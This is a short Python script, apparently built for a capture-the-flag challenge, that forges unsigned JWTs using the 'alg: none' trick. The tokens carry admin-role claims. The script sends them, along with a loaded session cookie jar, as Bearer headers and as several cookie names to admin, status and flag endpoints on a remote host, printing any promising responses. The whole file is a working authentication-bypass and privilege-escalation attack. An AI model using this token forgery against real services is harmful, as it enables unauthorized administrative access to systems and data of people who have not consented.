import requests
import http.cookiejar
import base64
import json

session = requests.Session()
cj = http.cookiejar.MozillaCookieJar("/Users/ricksabchez/workspace/ramzolmasal_cookies.txt")
cj.load(ignore_discard=True, ignore_expires=True)
session.cookies = cj

def b64url(data):
    if isinstance(data, dict) or isinstance(data, list):
        data = json.dumps(data, separators=(',', ':')).encode('utf-8')
    elif isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

# None algorithm JWT
headers_none = {"alg": "none", "typ": "JWT"}
payloads = [
    {"id": "88004c9a", "nickname": "m4tinbeigi", "role": "admin", "is_admin": True, "admin": True},
    {"user": "admin", "role": "admin", "admin": True},
    {"username": "admin", "role": "admin"},
    {"sub": "admin", "role": "admin"},
    {"sub": "88004c9a", "admin": True, "role": "admin"},
    {"role": "admin"},
    {"witness": "self", "role": "admin"},
    {"shahed": "rubah", "role": "admin"}
]

endpoints = [
    "api/me",
    "api/status",
    "api/challenges",
    "api/admin",
    "api/shahed",
    "api/nabat",
    "api/flag"
]

for p in payloads:
    token = f"{b64url(headers_none)}.{b64url(p)}."
    print("Testing Token:", token[:40] + "...")
    
    # Try as Cookie: ctf_token, ctf_session, token, jwt
    # Try as Header: Authorization: Bearer <token>
    for ep in endpoints:
        url = f"https://256.yektanet.tech/ramzolmasal/{ep}"
        
        # 1. Bearer Header
        r1 = session.get(url, headers={"Authorization": f"Bearer {token}"})
        if r1.status_code not in [404, 401] and len(r1.text) > 20:
            if "error" not in r1.text or "admin" in r1.text:
                print(f"  Bearer -> {ep}: {r1.status_code} | {r1.text[:100]}")
        
        # 2. Cookie ctf_jwt
        r2 = session.get(url, cookies={"ctf_jwt": token, "jwt": token, "token": token, "ctf_token": token})
        if r2.status_code not in [404, 401] and len(r2.text) > 20:
            if "error" not in r2.text or "admin" in r2.text:
                print(f"  Cookie -> {ep}: {r2.status_code} | {r2.text[:100]}")

print("JWT testing done.")
